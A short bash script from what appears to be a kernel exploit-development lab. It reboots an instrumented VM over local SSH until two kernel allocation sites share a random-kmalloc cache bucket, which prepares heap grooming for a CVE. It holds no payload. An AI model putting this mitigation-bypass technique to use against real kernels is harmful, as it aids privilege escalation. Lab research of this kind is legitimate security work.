#!/bin/bash
# find-match-fixed.sh [max_boots] - reboot the instrumented twin until the
# victim save_options site and the saved_syn site share a real random-kmalloc
# bucket (corrected hash constant).  Uses the isolated instrumented role
# (:2101, tap-cve-ins), so the legacy/other-session loops cannot touch it.
set -u
LAB=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
MAX=${1:-40}
SSH="ssh -i $LAB/lab/ssh/id_ed25519 -p 2101 -o StrictHostKeyChecking=no \
     -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
     -o ConnectionAttempts=1 -o ControlMaster=no -o ControlPath=none \
     -o LogLevel=ERROR ubuntu@localhost"
for i in $(seq 1 "$MAX"); do
  echo "=== boot $i $(date +%T) ==="
  bash "$LAB/lab/stop.sh" instrumented >/dev/null 2>&1
  sleep 2
  NO_GDB=1 LAB_NET=tap NO_WAIT=1 bash "$LAB/lab/launch.sh" instrumented >/dev/null 2>&1
  ok=0
  for j in $(seq 1 45); do
    if timeout 8 $SSH 'echo ok' >/dev/null 2>&1; then ok=1; break; fi
    sleep 5
  done
  if [ "$ok" != 1 ]; then echo "boot $i: ssh timeout"; continue; fi
  r=$(timeout 20 $SSH 'sudo python3 -' < "$LAB/lab/cache_match_fixed.py" 2>&1)
  echo "boot $i: $r"
  if echo "$r" | grep -q ' MATCH$'; then
    echo "FOUND_MATCH boot=$i"
    echo "$i" > /tmp/cve-match-fixed
    exit 0
  fi
done
echo "NO_MATCH_IN_$MAX"
exit 1
